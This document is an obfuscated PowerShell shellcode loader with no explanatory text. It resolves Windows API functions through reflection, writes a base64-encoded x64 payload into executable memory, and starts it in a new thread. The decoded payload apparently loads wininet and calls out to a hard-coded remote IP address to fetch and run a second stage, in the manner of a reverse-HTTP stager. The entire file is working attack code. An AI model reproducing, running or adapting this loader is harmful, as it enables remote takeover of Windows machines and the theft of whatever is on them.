function vc5eok5YhDzy {
	Param ($aI5mZ91MCxC3, $mwmpw)		
	$vrwB3BGpck = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $vrwB3BGpck.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($vrwB3BGpck.GetMethod('GetModuleHandle')).Invoke($null, @($aI5mZ91MCxC3)))), $mwmpw))
}

function f1j9MGc {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $ldO,
		[Parameter(Position = 1)] [Type] $aPyhXOERyjGz = [Void]
	)
	
	$iZGUo = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$iZGUo.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $ldO).SetImplementationFlags('Runtime, Managed')
	$iZGUo.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $aPyhXOERyjGz, $ldO).SetImplementationFlags('Runtime, Managed')
	
	return $iZGUo.CreateType()
}

[Byte[]]$yG__FVuZZh1 = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11IMdtTSb53aW5pbmV0AEFWSInhScfCTHcmB//VU1NIieFTWk0xwE0xyVNTSbo6VnmnAAAAAP/V6A8AAAAxMTkuMjQ2LjIyMC4yNABaSInBScfAXBEAAE0xyVNTagNTSbpXiZ/GAAAAAP/V6NUAAAAvdlRfeDNkaFR1U09KMDRqUjA5aDJTZ1diZHYwOWx4SVBQNGR4UVRhRFFPa1dWVlVkTE9XUGRmUlR4YVVuN0d1LUd3UlY0RjJMSnZmTjJBZW0tejJ2NXNMZjluYW9sYU04SG8zWEs0ajNzZVF1ZElvWUdsNVVYWkp1MzJ5MHhaZ2FxV01nWHAwWWRZSmVwRExqeHBIQnEzZjQyT3U0YWNudV9jcFdwejBVcXRGRUJ0NkctZm9SSnFLVFdDcTBneDFTWlNDTlBWRnJVUFFYRTZvbF9feQBIicFTWkFYTTHJU0i4ADKghAAAAABQU1NJx8LrVS47/9VIicZqCl9IifFqH1pSaIAzAABJieBqBEFZSbp1Rp6GAAAAAP/VSInxU1pNMcBNMclTU0nHwi0GGHv/1YXAdR9Ix8GIEwAASbpE8DXgAAAAAP/VSP/PdALrrehWAAAAU1lqQFpJidHB4hBJx8AAEAAASbpYpFPlAAAAAP/VSJNTU0iJ50iJ8UiJ2knHwAAgAABJiflJuhKWieIAAAAA/9VIg8QghcB0smaLB0gBw4XAddJYWMNYagBZScfC8LWiVv/V")
		
$tli0W0FS = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((vc5eok5YhDzy kernel32.dll VirtualAlloc), (f1j9MGc @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $yG__FVuZZh1.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($yG__FVuZZh1, 0, $tli0W0FS, $yG__FVuZZh1.length)

$ujJyrgf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((vc5eok5YhDzy kernel32.dll CreateThread), (f1j9MGc @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$tli0W0FS,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((vc5eok5YhDzy kernel32.dll WaitForSingleObject), (f1j9MGc @([IntPtr], [Int32]))).Invoke($ujJyrgf,0xffffffff) | Out-Null